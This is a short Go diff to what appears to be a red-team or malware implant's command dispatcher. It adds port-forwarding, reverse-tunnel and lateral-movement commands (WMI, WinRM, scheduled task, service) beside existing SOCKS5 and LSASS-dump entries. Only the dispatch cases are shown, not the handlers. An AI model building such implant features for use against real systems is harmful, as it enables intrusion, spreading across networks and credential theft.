@@ -148,6 +148,20 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 		handleSOCKS5Stop(result)
 	case "socks5_status":
 		handleSOCKS5Status(result)
+	// Port forwarding / reverse tunnel
+	case "portfwd_start":
+		handlePortFwdStart(agent, cmd, result)
+	case "portfwd_stop":
+		handlePortFwdStop(cmd, result)
+	// Lateral movement
+	case "lateral_wmi":
+		handleLateralWMI(cmd, result)
+	case "lateral_winrm":
+		handleLateralWinRM(cmd, result)
+	case "lateral_schtask":
+		handleLateralSchtask(cmd, result)
+	case "lateral_service":
+		handleLateralService(cmd, result)
 
 	// ── New techniques ─────────────────────────────────────────────────────
 	// LSASS alternative dump methods
